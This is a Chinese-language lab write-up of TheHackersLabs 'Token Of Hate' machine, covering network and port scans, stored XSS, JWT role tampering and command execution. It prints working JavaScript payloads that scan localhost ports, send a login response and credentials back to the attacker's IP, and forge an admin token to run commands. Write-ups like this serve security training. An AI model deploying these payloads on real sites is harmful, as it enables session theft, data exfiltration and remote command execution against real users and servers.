---
title: thehackerslabs Token Of Hate靶机复盘
author: LingMj
data: 2025-03-25
categories: [thehackerslabs]
tags: [upload]
description: 难度-Hard
---

## 网段扫描
```
root@LingMj:~/tools# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.38	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.71	a0:78:17:62:e5:0a	Apple, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:~/tools# nmap -p- -sV -sC 192.168.137.38 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 21:56 EDT
Nmap scan report for TheHackersLabs-TokenOfHate.mshome.net (192.168.137.38)
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 fd:6a:70:17:f7:40:07:fe:eb:5a:5d:36:56:32:f0:39 (ECDSA)
|_  256 2d:3d:4b:a1:f6:e3:8d:91:09:4c:a8:b3:85:7d:b5:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.30 seconds
```

## 获取webshell
![picture 0](../assets/images/a74109741e6a843a5f1a0618c1b3d3509fe14938cd5469443dcfd06fb67a3d40.png)  

>小马还是很难的，看完wp发现当时做的方向错了不是直接注入替换用户拿到shell，所以我会把内容先说明后面有困难按wp继续
>
![picture 1](../assets/images/b593c0d220e6bffb804e2d880a47d8f27225fa9bf89d59e35274b6b6524ee41f.png)  

>这个小马有图片隐写，出现是一只兔子不过没啥用
>

![picture 2](../assets/images/202e56ff837f8ab95476c4b78d67624ee9c5ff5744663ddd094fca724630e70a.png)  
![picture 3](../assets/images/4532590baa49555027cd739173ce197a479e2f243e94bb35c13f6fd6c4be7cc5.png)  
![picture 4](../assets/images/3be917d119fa0472d3188ffe7dbc85c93edcc26e2270789655eeb7b1b1c301bf.png)  

>这是当时研究的，即使把登录做了但是还是无法成功拿到控制，所以这个方案必然是错误了
>

![picture 5](../assets/images/3dcf8b21fea31a6aea36b4c150e60ad86bf48cc68c9a03a83f7e9fad18f2b8e8.png)  
![picture 6](../assets/images/0dbe599446063a55bdb2157165b714d600adfa80b37519ebfa08f3fd333f1317.png)  
![picture 7](../assets/images/7a4d524296602bfad29ae4d809668931a519c791e94f3efdc7a07f1d6aea3238.png)  

>注册存在xss我们现在利用这个把token什么的带出来
>

```
const checkPort = (port) =>{
  fetch(`http://localhost:${port}`,{mode:"no-cors"}).then(() =>{
    let img = document.createElement("img");
    img.src = `http://192.168.137.190/ping?port=${port}`;
  });

for (let i=1;i<1000;i++) {checkPort(i);}
```

![picture 8](../assets/images/33749d0c0ab90ceb3c1d6b2a8c004d16572f184bb1db21d82b27c62153797aa3.png)  
![picture 9](../assets/images/b385c71750692f31416a1d8571331a1142d99e5f43d1499f6c44a98c552325d0.png)  
![picture 10](../assets/images/f244fcafaecf4769ebbd05c58918e7579174bbfb0689d1d49b49857babde2985.png)  


>有点难，我唯一能确定的方式，但是没有其他wp，所以这些都是我直接验证
>

![picture 11](../assets/images/e757466f23ac3376553bbcbce89b89ca1a35d3f358e6d27ef579043b6f993a5b.png)  
![picture 12](../assets/images/2db6ade56955b7e437f873b85b835cca1076e2a84bea2aba2b6993a734fe6a4f.png)  
![picture 13](../assets/images/dc30d9f20042607a04483494901e03611bcf25193689111a19808a05549df2c1.png)  
![picture 14](../assets/images/dc20df3738180458b378818595c4b0e7712bfac3afac2792f12af8849759f2f8.png)  

>弹个cookie可以拿东西有点意思了
>

![picture 15](../assets/images/37fa1feea4400e5ea7349b8e647c906731a7b854a6c9954cf37f4db2c6917733.png)  

>那么问题来了不知道有啥用现在，突然有眉目了可以把刚刚没成功的代码扔到js文件让他弹东西
>

![picture 16](../assets/images/f9cb037fbbe8843b8d4bc59ff4d6f3b4117aa563d2173353b8b5bfee467ee31a.png)  

>我看到它是一个定时任务它会进行js的不断访问
>

![picture 17](../assets/images/da693dafffda221aef0a354b4d02be547d2b8da150a22b4bcee56d583feddee1.png)  

>不过好像没成功，换一个方式
>

![picture 18](../assets/images/d722ec493411ee36d6b9a2306a1c1c4c5365adcd79c7967ed8ab8aef8084b964.png)  
![picture 19](../assets/images/4eb0d86521523c3a84a5d8dbf9b609a255e9c1509e7361ec6252d4641e106d6d.png)  

>当然我不会写都是搬wp的
>

![picture 20](../assets/images/c5336b22d9ca371709b0b90e6d77e618b034fd7486f24db6f72f5de0683328ca.png)  
![picture 21](../assets/images/15638995bfe1ba767176ba7c63e25acd6d2a5d9b954ac7cebfb22a53ef09d69c.png)  
![picture 22](../assets/images/59641ea4efa172cf27650ab0f774b487140bf1f05a5e8554487e8fa24715894f.png)  

>把东西发到pdf了OK有意思
>

![picture 23](../assets/images/1722c4f64046307c7e63d954353331cc66d3cc6ef9cc350837203f8859f36c51.png)  

>根据同样方法文件读取
>

```
const users = [
    { nombre: "Jose", pas: "FuLqqEAErWQsmTQQQhsb" },
];

function testUser(user) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/login", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
        if (xhr.status >= 200)
            new Image().src = `http://192.168.137.190/?user=${user.username}&response=${btoa(xhr.responseText)}`
    }
    xhr.send(JSON.stringify(user));
}

users.forEach(async user => {
    // Envía la petición con el body en JSON
    testUser({
        username: user.nombre,
        password: user.pas
    });
});
```

![picture 24](../assets/images/9e5687a45a019be4ed082234324e3d40428143ef71139383cf80c65b5fce65a5.png)  
![picture 25](../assets/images/890a70542dd1f9f45d141fb159cab557431fca41350662e6a987ae3b0c23e8eb.png)  
![picture 26](../assets/images/b4f7fdfe2e266ff261cb4a71c1c3db973a6459f669bcfcd13335bd49ea0e61c5.png)  

>jwt嵌套jwt
>

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0Mjg3NTExNCwiZXhwIjoxNzQyODc4NzE0fQ.J047S-ajtGvX_A8mqDoRym6jM1QpGnx78VmRxa6m1Rk
```

![picture 27](../assets/images/8189c79d980a1e32652f9872e10aef6af8547194f6202f41335bfe355cb61b98.png)  

>解个密改成admin应该就行了
>

![picture 28](../assets/images/c03146155b5778cd927fc5065be0136f73b4ab7b2b6c4a5caf30d5a759eaf054.png)  

>按照这个格式写一下就行了
>

```
var command = "id";

// Petición para realizar el login y obtener el token actualizado.
petition1 = new XMLHttpRequest();
petition1.open('POST', 'http://localhost:3000/login', true);
petition1.setRequestHeader('Content-Type', 'application/json');

// Petición para ejecutar el comando.
petition2 = new XMLHttpRequest();
petition2.open('POST', 'http://localhost:3000/command', true);
petition2.setRequestHeader('Content-Type', 'application/json');

function base64urlDecode(str) {
    // Reemplaza caracteres específicos de Base64URL
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    // Añadir padding si es necesario
    while (str.length % 4) {
        str += '=';
    }
    return atob(str);
}

function base64urlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

petition2.onload = () => {
    document.write("Resultado");
    document.write(petition2.responseText);
}

petition1.onload = () => {
    // Obtenemos el token JWT y lo separamos en sus partes.
    let tokenParts = JSON.parse(petition1.responseText).token.split(".");

    // Decodificamos la parte del payload y la convertimos en objeto.
    let payloadDecoded = JSON.parse(base64urlDecode(tokenParts[1]));

    // Modificamos el role del usuario.
    payloadDecoded.role = "admin";

    // Codificamos otra vez el payload modificado.
    tokenParts[1] = base64urlEncode(JSON.stringify(payloadDecoded));

    // Reconstruimos el token modificado.
    let tokenModificado = tokenParts.join(".");

    sendSecondPetition(tokenModificado);
}

function sendSecondPetition(tokenModificado) {
    petition2.send(`{"token":"${tokenModificado}","command":"${command}"}`);
}

petition1.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}');
```

>这作者做这个真牛
>

![picture 29](../assets/images/a021c22859df78503ee5fe915d85b0a72d874dbb58bdb3a82a99620a2896283c.png)  

>不过jwt压根没改是什么
>

![picture 30](../assets/images/d975a200473913523e2af7d1d78e4a594c26bb7086505862cfd42ca30b4f9f06.png)  

>id换一下就行
>
![picture 31](../assets/images/48fdce11e74654d6649890213de4deb30de47df0f0916bad4e81b3bd63c9b4bd.png)  



## 提权
![picture 32](../assets/images/9ab087bfcccc6e069be35f31ee882dd97429d6e725b37b73a4bc821b57cc7bfb.png)  
![picture 33](../assets/images/bea9331b5717dd20d9de2b61d7fffb357e9f5a48261c6103e0fd9c6b8f30bc68.png)  
![picture 34](../assets/images/c972273b4d17bdf229b7cb8c2317b7b365bf925672a1b4ac451b0987a343ac9a.png)  

>看起来是内核漏洞
>

![picture 35](../assets/images/47651174cd961bbb2f196ed6c463b712c462622bf314f4add120a1209c5bab94.png)  

>看来不是
>

![picture 36](../assets/images/242e0f53815d042ec0dd40e95149279ae6543c4d30d44a2b253e512ed58eff85.png)  

>猜一下是这个node
>

![picture 37](../assets/images/787a499e46b32a0a0a35a14a874769df5d2a8fa74b56b1eea37018696a0264ca.png)  

>猜测成功，后面的内容就不过前面的精彩，但是也是一个非常好的靶机
>


>userflag:98f2b2e68938801b0321b8cc7a9641a3
>
>rootflag:
>